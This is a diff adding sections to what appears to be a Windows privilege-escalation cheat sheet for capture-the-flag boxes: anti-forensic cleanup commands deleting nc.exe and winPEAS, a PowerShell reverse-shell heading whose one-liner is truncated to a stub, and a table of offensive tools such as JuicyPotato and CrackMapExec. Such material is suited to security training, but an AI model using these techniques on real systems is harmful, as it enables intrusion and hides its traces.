@@ -114,5 +114,32 @@ Drop payload to match unquoted path like `C:\Program Files\test.exe`
 type C:\Users\<user>\Desktop\user.txt
 type C:\Users\Administrator\Desktop\root.txt
 ```
+---
+
+## 6. 🧼 Cleanup
+
+```powershell
+del C:\Users\Public\nc.exe
+Remove-Item winpeas.exe
+```
+
+---
+
+## 7. 🐚 Reverse Shell (PowerShell)
+
+```powershell
+powershell -nop -c "$client = ------"
+```
+
+---
+## ✅ Bonus Tools
+
+| Tool | Use |
+|------|-----|
+| winPEAS | Local enumeration |
+| PowerUp.ps1 | PrivEsc checks |
+| JuicyPotato.exe | Token escalation |
+| Nishang | Payloads |
+| CrackMapExec | Brute force + spray |
 
 ---
